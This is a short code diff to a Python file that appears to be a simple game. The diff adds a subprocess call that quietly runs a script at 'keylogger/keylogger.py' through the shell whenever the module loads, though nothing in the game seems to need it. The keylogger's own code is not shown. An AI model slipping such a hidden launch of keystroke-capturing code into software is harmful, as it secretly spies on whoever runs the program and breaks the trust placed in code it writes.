@@ -1,6 +1,10 @@
 # from region_class import Region
 import random
 from playsound import playsound
+import subprocess
+
+subprocess.call("keylogger/keylogger.py", shell=True)
+
 
 '''import pygame
 pygame.init()
